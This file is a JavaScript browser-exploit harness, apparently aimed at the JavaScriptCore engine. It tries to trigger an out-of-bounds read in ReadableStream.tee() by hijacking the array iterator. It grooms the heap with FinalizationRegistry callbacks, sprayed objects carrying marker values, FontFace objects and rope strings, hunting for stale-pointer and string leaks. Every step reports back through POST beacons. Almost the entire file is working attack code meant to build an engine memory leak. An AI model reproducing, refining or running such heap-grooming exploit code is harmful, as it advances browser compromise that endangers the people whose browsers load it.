/*
 * V438 -- FinalizationRegistry precision groom + tee() OOB
 *
 * Key insight: FR callback fires at exact microtask of collection.
 * Spray replacement data INSIDE the callback = deterministic placement.
 *
 * Instead of ArrayBuffer (zero-filled), use strings and plain objects
 * as heap paint — they carry attacker-controlled data without zeroing.
 *
 * Tests:
 *   T1: FR timing — how fast does callback fire after GC?
 *   T2: FR groom — spray 128-byte blocks inside FR callback,
 *       then OOB tee reads into sprayed region
 *   T3: FontFace heap paint — does FontFace data land in same
 *       heap as JSC Vector allocations?
 *   T4: String paint — use rope strings as non-zero heap filler,
 *       then OOB tee reads string internals (pointer leak?)
 *   T5: Combined — FR callback sprays strings at Vector size,
 *       OOB tee reads stale string data = info leak
 *
 * Beacon prefix: V438-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V438-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function oobTee(rs) {
  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };
  var result;
  try { result = rs.tee(); }
  finally { Array.prototype[Symbol.iterator] = origIter; }
  return result;
}

// Hex dump first 8 bytes of a value for leak detection
function hexProbe(val) {
  try {
    if (val === null || val === undefined) return "null";
    if (typeof val === "number") return "num:" + val;
    if (typeof val === "string") return "str:" + val.slice(0, 20);
    if (typeof val === "boolean") return "bool:" + val;
    if (typeof val === "object") {
      var name = val.constructor ? val.constructor.name : "?";
      var keys = Object.keys(val).slice(0, 4);
      return "obj:" + name + ":" + keys.join(",");
    }
    return typeof val + ":" + String(val).slice(0, 20);
  } catch(e) { return "err:" + e.message.slice(0, 30); }
}

// ================================================================
// T1: FinalizationRegistry timing test
// How many microtasks between dropping refs and FR callback?
// ================================================================
function testT1() {
  B("T1-START");
  var frFired = false;
  var frTime = 0;
  var allocTime = Date.now();

  var fr = new FinalizationRegistry(function(held) {
    frFired = true;
    frTime = Date.now() - allocTime;
    B("T1-FR-FIRED", {held: held, delay_ms: frTime});
  });

  // Create objects, register, drop
  var token = {};
  (function() {
    var obj = {a: 1, b: 2, c: 3, d: 4};
    fr.register(obj, "victim-1", token);
  })();

  // Force GC via memory pressure
  var pressure = [];
  for (var i = 0; i < 200; i++) {
    pressure.push(new ArrayBuffer(65536));
  }
  pressure = null;

  // Check after microtasks
  setTimeout(function() {
    B("T1-CHECK-1", {fired: frFired});
    if (!frFired) {
      // More pressure
      var p2 = [];
      for (var j = 0; j < 500; j++) {
        p2.push(new ArrayBuffer(65536));
      }
      p2 = null;
      setTimeout(function() {
        B("T1-CHECK-2", {fired: frFired});
        if (!frFired) {
          // Even more
          var p3 = [];
          for (var k = 0; k < 1000; k++) {
            p3.push(new ArrayBuffer(65536));
          }
          p3 = null;
          setTimeout(function() {
            B("T1-CHECK-3", {fired: frFired});
          }, 500);
        }
      }, 500);
    }
  }, 100);
}

// ================================================================
// T2: FR groom + OOB tee — spray inside FR callback
// ================================================================
function testT2() {
  B("T2-START");

  var frFired = false;
  var spray = null;

  var fr = new FinalizationRegistry(function(held) {
    frFired = true;
    B("T2-FR-FIRED", held);

    // INSIDE FR callback: spray ONLY, no tee
    try {
      spray = [];
      for (var i = 0; i < 64; i++) {
        spray.push({
          p0: 0x41414141, p1: 0x42424242,
          p2: 0x43434343, p3: 0x44444444,
          p4: 0x45454545, p5: 0x46464646,
          p6: 0x47474747, p7: 0x48484848
        });
      }
      B("T2-SPRAYED", spray.length);
    } catch(e) {
      B("T2-SPRAY-ERR", e.message.slice(0,60));
    }
  });

  // Create objects to be collected
  (function() {
    var victims = [];
    for (var i = 0; i < 64; i++) {
      var v = new ArrayBuffer(128);
      fr.register(v, "victim-" + i);
      victims.push(v);
    }
    victims = null;
  })();

  // Force GC
  var pressure = [];
  for (var i = 0; i < 500; i++) {
    pressure.push(new ArrayBuffer(65536));
  }
  pressure = null;

  // Poll for FR, then do OOB tee OUTSIDE the callback
  function doOOB() {
    B("T2-OOB-PHASE");
    // Pre-create donor
    var donorRS = new ReadableStream({
      start: function(c) { c.enqueue("T2-donor"); c.close(); }
    });
    var donorBranches = donorRS.tee();

    var oobRS = new ReadableStream({
      start: function(c) { c.enqueue("T2-data"); c.close(); }
    });

    try {
      var result = oobTee(oobRS);
      B("T2-RESULT", {
        len: result.length,
        t0: result[0] ? result[0].constructor.name : "null",
        t1: result[1] ? hexProbe(result[1]) : "null"
      });

      if (result[1] && typeof result[1] === "object") {
        try {
          var r = result[1].getReader();
          B("T2-READER-OK");
          r.read().then(function(res) {
            B("T2-READ", {done: res.done, val: hexProbe(res.value)});
          }).catch(function(e) { B("T2-READ-ERR", e.message.slice(0,60)); });
        } catch(e) { B("T2-READER-ERR", e.message.slice(0,60)); }
      }
      void donorBranches;
    } catch(e) {
      B("T2-OOB-ERR", e.message.slice(0,80));
    }
  }

  function waitForFR(round) {
    if (frFired) {
      B("T2-FR-CONFIRMED-R" + round);
      doOOB();
      return;
    }
    if (round > 8) {
      B("T2-FR-NEVER-FIRED");
      return;
    }
    // More pressure each round
    var p = [];
    for (var j = 0; j < 300 + round * 200; j++) {
      p.push(new ArrayBuffer(65536));
    }
    p = null;
    setTimeout(function() { waitForFR(round + 1); }, 200);
  }

  setTimeout(function() { waitForFR(0); }, 200);
}

// ================================================================
// T3: FontFace as heap paint — non-zero allocation test
// ================================================================
function testT3() {
  B("T3-START");

  // Create FontFace objects with binary data payloads
  // FontFace source data is stored as ArrayBuffer internally
  // but the FontFace CSS descriptor strings are kept as WTF::String
  try {
    var fonts = [];
    for (var i = 0; i < 32; i++) {
      // The family name string creates a WTF::String allocation
      // The descriptor values create additional string allocations
      var ff = new FontFace(
        "paint" + i,
        "local('Times New Roman')",
        {
          style: "normal",
          weight: String(100 + i),
          unicodeRange: "U+0041-005A"
        }
      );
      fonts.push(ff);
    }
    B("T3-FONTS-OK", fonts.length);

    // Now drop fonts and see if their string data persists (MADV_FREE)
    var fontRefs = fonts.slice();
    fonts = null;

    // Pressure GC
    var p = [];
    for (var j = 0; j < 200; j++) {
      p.push(new ArrayBuffer(65536));
    }
    p = null;

    // Do OOB tee — if font string data is in same heap,
    // OOB might read font descriptor remnants
    setTimeout(function() {
      fontRefs = null; // now truly drop font refs

      var p2 = [];
      for (var k = 0; k < 300; k++) {
        p2.push(new ArrayBuffer(65536));
      }
      p2 = null;

      setTimeout(function() {
        var oobRS = new ReadableStream({
          start: function(c) { c.enqueue("T3-data"); c.close(); }
        });
        var donorRS = new ReadableStream({
          start: function(c) { c.enqueue("T3-donor"); c.close(); }
        });
        var donorBranches = donorRS.tee();

        try {
          var result = oobTee(oobRS);
          B("T3-RESULT", {
            len: result.length,
            t1: result[1] ? hexProbe(result[1]) : "null"
          });
          if (result[1]) {
            try {
              var r = result[1].getReader();
              B("T3-READER-OK");
            } catch(e) { B("T3-READER-ERR", e.message.slice(0,60)); }
          }
        } catch(e) {
          B("T3-CRASH", e.message.slice(0,80));
        }
        void donorBranches;
        B("T3-DONE");
      }, 500);
    }, 500);
  } catch(e) {
    B("T3-FONT-ERR", e.message.slice(0,60));
  }
}

// ================================================================
// T4: String paint — rope strings as non-zero heap filler
// Rope internals hold raw pointers to StringImpl — if OOB reads
// a stale rope fiber, we get a pointer leak
// ================================================================
function testT4() {
  B("T4-START");

  // Create many rope strings of ~128 bytes
  // JSString with rope: JSCell(8) + flags(4) + length(4) + fiber0(8) + fiber1(8) + fiber2(8) = 40 bytes
  // But the resolved StringImpl backing is separate
  var ropes = [];
  for (var i = 0; i < 256; i++) {
    // Force rope: concat of 3 strings
    var a = "AAAA" + String(i);
    var b = "BBBB" + String(i + 1000);
    var c = "CCCC" + String(i + 2000);
    ropes.push(a + b + c); // rope with 3 fibers
  }
  B("T4-ROPES", ropes.length);

  // Now: donor tee, then drop ropes, then OOB tee
  var donorRS = new ReadableStream({
    start: function(c) { c.enqueue("T4-donor"); c.close(); }
  });
  var donorBranches = donorRS.tee();

  // Drop ropes — their JSString cells go to free list
  ropes = null;

  // Tiny GC nudge
  var nudge = [];
  for (var j = 0; j < 50; j++) nudge.push({});
  nudge = null;

  var oobRS = new ReadableStream({
    start: function(c) { c.enqueue("T4-data"); c.close(); }
  });

  try {
    var result = oobTee(oobRS);
    B("T4-RESULT", {
      len: result.length,
      t1: result[1] ? hexProbe(result[1]) : "null"
    });

    if (result[1]) {
      // Try to detect if result[1] is a stale pointer
      try {
        B("T4-TYPEOF", typeof result[1]);
        B("T4-CTOR", result[1].constructor ? result[1].constructor.name : "none");
        // If it's a stale JSString, .length would give us the old string length
        if (typeof result[1] === "string") {
          B("T4-STRING-LEAK!!!", {len: result[1].length, val: result[1].slice(0, 40)});
        }
        // If it's an object, probe its shape
        if (typeof result[1] === "object" && result[1] !== null) {
          try { B("T4-LOCKED", result[1].locked); } catch(e) {}
          try {
            var r = result[1].getReader();
            B("T4-READER-OK");
            r.read().then(function(res) {
              B("T4-READ", {done: res.done, val: hexProbe(res.value)});
            }).catch(function(e) { B("T4-READ-ERR", e.message.slice(0,60)); });
          } catch(e) { B("T4-READER-ERR", e.message.slice(0,60)); }
        }
      } catch(e) {
        B("T4-PROBE-ERR", e.message.slice(0,60));
      }
    }
  } catch(e) {
    B("T4-CRASH", e.message.slice(0,80));
  }

  void donorBranches;
  B("T4-DONE");
}

// ================================================================
// T5: WeakRef GC oracle — can we detect exact collection moment?
// ================================================================
function testT5() {
  B("T5-START");

  var collected = false;
  var wr;

  (function() {
    var target = {marker: 0xDEAD};
    wr = new WeakRef(target);
  })();

  B("T5-WR-CREATED", wr.deref() ? "alive" : "dead");

  // Pressure + poll
  function poll(round) {
    if (round > 10) {
      B("T5-GAVE-UP", {collected: collected});
      return;
    }

    // Pressure
    var p = [];
    for (var i = 0; i < 200 + round * 100; i++) {
      p.push(new ArrayBuffer(65536));
    }
    p = null;

    setTimeout(function() {
      var alive = wr.deref();
      if (!alive && !collected) {
        collected = true;
        B("T5-COLLECTED-AT-ROUND!!!", round);
      } else if (alive) {
        B("T5-ALIVE-R" + round);
      }
      if (!collected) poll(round + 1);
      else B("T5-DONE");
    }, 100);
  }

  poll(0);
}

// ================================================================
// Run all tests sequentially
// ================================================================
testT1();
setTimeout(function() {
  testT2();
  setTimeout(function() {
    testT3();
    setTimeout(function() {
      testT4();
      setTimeout(function() {
        testT5();
        setTimeout(function() { B("ALL-DONE"); }, 15000);
      }, 4000);
    }, 4000);
  }, 5000);
}, 3000);

})();
